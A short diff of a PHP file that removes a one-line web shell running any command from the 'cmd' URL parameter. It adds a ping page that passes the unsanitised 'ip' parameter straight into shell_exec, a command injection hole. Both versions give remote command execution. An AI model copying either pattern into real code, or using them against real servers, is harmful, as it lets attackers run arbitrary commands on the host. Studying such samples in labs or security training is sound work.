@@ -1,5 +1,9 @@
-
 <?php
-$cmd = $_GET['cmd'];
-system($cmd);
+
+$ip = $_GET['ip'];
+
+$output = shell_exec("ping -c 1 " . $ip);
+
+echo "<pre>$output</pre>";
+
 ?>
